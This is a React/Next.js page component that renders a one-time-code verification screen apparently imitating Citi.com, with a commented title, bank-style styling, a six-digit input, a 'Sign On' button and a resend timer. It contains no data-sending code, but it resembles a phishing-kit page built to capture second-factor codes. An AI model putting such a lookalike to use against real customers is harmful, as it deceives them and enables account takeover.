"use client";

import React, { useEffect, useState } from "react";
import Header from "@/components/layout/Header";
import Footer from "@/components/layout/Footer";

// export const metadata = {
//   title: "OTP Verification | Citi.com",
// };

const OtpPage = () => {
  const [seconds, setSeconds] = useState(60);
  const [otp, setOtp] = useState("");

  useEffect(() => {
    if (seconds > 0) {
      const timer = setTimeout(() => setSeconds((s) => s - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [seconds]);

  return (
    <main className="bg-[#f5f7fa] min-h-screen flex flex-col">
      <Header />

      <div className="flex-grow flex items-center justify-center px-4 min-h-[90vh]">
        <div className="w-full max-w-md bg-white rounded-2xl shadow-md p-8">
          <h1 className="text-2xl font-bold text-[#0d2d62] mb-4">
            Confirm your identity
          </h1>
          <p className="text-sm text-gray-700 mb-6">
            For security reasons, a 6-digit code has been sent to{" "}
            <span className="font-semibold">XXXX</span>.
          </p>

          <input
            placeholder="0 0 0 0 0 0"
            type="text"
            name="otp"
            value={otp}
            onChange={(e) =>
              setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))
            }
            className="h-12 w-full border rounded-lg px-4 text-lg tracking-widest text-center placeholder:tracking-normal placeholder:font-medium focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
          />

          <button className="cursor-pointer w-full py-3 mt-6 bg-[#0d2d62] rounded-lg font-bold text-white hover:bg-[#08325a] transition-colors">
            Sign On
          </button>

          <div className="mt-4 text-center text-sm text-gray-600">
            {seconds > 0 ? (
              <span>Resend code in {seconds}s</span>
            ) : (
              <button
                onClick={() => setSeconds(60)}
                className="text-[#0d2d62] font-semibold hover:underline"
              >
                Resend code
              </button>
            )}
          </div>
        </div>
      </div>

      <Footer />
    </main>
  );
};

export default OtpPage;
